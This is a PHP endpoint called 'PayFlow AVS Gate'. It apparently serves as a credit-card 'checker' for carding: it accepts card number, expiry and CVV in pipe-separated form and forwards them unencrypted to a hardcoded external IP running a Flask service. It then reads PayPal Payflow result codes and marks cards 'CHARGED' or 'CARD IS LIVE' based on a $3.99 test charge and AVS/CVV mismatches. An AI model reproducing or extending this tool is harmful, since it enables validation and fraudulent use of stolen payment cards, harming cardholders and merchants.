<?php
// PayFlow AVS Gate - Calls Python Flask Endpoint
// Returns JSON response

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    parse_str(file_get_contents('php://input'), $input);
}

$cc = $input['cc'] ?? $_POST['cc'] ?? '';

if (empty($cc)) {
    echo json_encode(['success' => false, 'error' => 'No card provided']);
    exit;
}

// Parse card details
$parts = explode('|', $cc);
if (count($parts) < 4) {
    echo json_encode(['success' => false, 'error' => 'Invalid card format']);
    exit;
}

list($cardNumber, $month, $year, $cvv) = array_map('trim', $parts);

if (strlen($year) == 2) $year = '20' . $year;

// Call Python Flask endpoint
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://185.227.111.153:5006/check?cc=" . urlencode($cc));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 45);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode !== 200) {
    echo json_encode(['success' => false, 'status' => 'declined', 'message' => 'Payment service unavailable']);
    exit;
}

$data = json_decode($response, true);

// Extract real PayPal response
$resultCode = $data['details']['RESULT'] ?? '';
$respMsg = $data['details']['RESPMSG'] ?? '';
$avs = $data['details']['AVSDATA'] ?? 'N/A';
$cvvMatch = $data['details']['CVV2MATCH'] ?? 'N/A';

// Determine status
// RESULT 0 = Approved (charged)
// RESULT 12 with AVS/CVV mismatch = Approved (card is LIVE)
// Any other RESULT = Declined
if ($resultCode === '0') {
    $status = 'approved';
    $message = "CHARGED ✅";
} elseif ($resultCode === '12' && (strpos($respMsg, 'AVS') !== false || strpos($respMsg, 'CVV') !== false || strpos($respMsg, '15004') !== false)) {
    $status = 'approved';
    $message = "CARD IS LIVE ✅ (AVS/CVV Mismatch)";
} else {
    $status = 'declined';
    $message = $respMsg;
}

echo json_encode([
    'success' => true,
    'status' => $status,
    'message' => $message,
    'gateway' => 'PayFlow AVS $3.99',
    'avs' => $avs,
    'cvv' => $cvvMatch,
    'result_code' => $resultCode
]);
?>
